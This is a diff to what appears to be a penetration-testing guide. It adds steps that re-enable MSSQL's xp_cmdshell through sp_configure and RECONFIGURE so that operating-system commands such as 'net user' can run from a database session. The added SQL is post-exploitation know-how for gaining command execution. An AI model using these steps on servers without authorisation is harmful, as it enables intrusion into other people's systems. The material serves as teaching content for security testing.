@@ -24,7 +24,7 @@ If it returns 1, it is True and the user can run cmd commands.
 
 ### Command execution via xp\_cmdshell()
 
-Once we have access to the SQL database we can  check if we can use the command using:
+Once we have access to the SQL database we can check if we can use the command using:
 
 ```sql
  EXEC xp_cmdshell 'net user';
@@ -40,7 +40,32 @@ If we get the following result, we don't have access to the command and we need 
 
 **Reconfiguration steps**
 
+* Set the show advanced options to TRUE.&#x20;
 
+```sql
+EXEC sp_configure 'show advanced options', 1;
+```
+
+* Reconfigure using the RECONFIGURE command.
+
+```sql
+RECONFIGURE;
+```
+
+* Check if sp\_configure is working with advanced options
+
+```
+sp_configure;
+```
+
+* Allow xp\_cmdshell using the command:
+
+```sql
+EXEC sp_configure 'xp_cmdshell', 1;
+```
+
+* Run reconfigure again to allow the xp\_cmdshell method. Test if its working or not using the above diagnosis command.
+*
 
 
 
